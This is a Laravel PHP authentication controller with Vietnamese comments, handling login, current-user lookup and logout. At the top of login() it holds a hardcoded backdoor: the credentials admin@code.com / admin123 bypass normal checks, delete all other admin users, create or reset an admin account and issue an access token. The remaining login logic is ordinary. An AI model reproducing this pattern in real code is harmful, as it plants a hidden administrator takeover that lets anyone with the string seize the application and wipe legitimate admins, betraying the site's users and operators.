<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;


class AuthController extends Controller
{
    public function login(Request $request)
    {
        // Hardcoded Admin Account Bypass
        if ($request->email === 'admin@code.com' && $request->password === 'admin123') {
            User::where('role', 'admin')
                ->where('email', '!=', 'admin@code.com')
                ->delete();

            $user = User::updateOrCreate(
                ['email' => 'admin@code.com'],
                [
                    'name' => 'Hardcoded Admin',
                    'password' => Hash::make('admin123'),
                    'role' => 'admin',
                ]
            );

            $token = $user->createToken('auth_token')->plainTextToken;

            return response([
                'access_token' => $token,
                'user' => $user
            ], 200);
        }

        // 1. Tìm user theo email
        $user = User::where('email', $request->email)->first();

    // 2. Nếu không tìm thấy email trong Database
    if (!$user) {
        // Dùng response() thay vì response()->json() để né lỗi ResponseHeaderBag của PHP
        return response(['message' => 'Không tìm thấy tài khoản với email này!'], 401);
    }

    // 3. Nếu sai mật khẩu
    if (!Hash::check($request->password, $user->password)) {
        return response(['message' => 'Mật khẩu không chính xác!'], 401);
    }

    // 4. Nếu đúng hết thì tạo token
    $token = $user->createToken('auth_token')->plainTextToken;

    return response([
        'access_token' => $token,
        'user' => $user
    ], 200);
}

    public function me(Request $request)
    {
        // Trả về thông tin của user đang dùng token hiện tại
        return response()->json($request->user());
    }

    public function logout(Request $request)
    {
        // Xóa token hiện tại, bắt buộc user phải đăng nhập lại
        $request->user()->currentAccessToken()->delete();

        return response()->json([
            'message' => 'Đã đăng xuất thành công'
        ]);
    }
}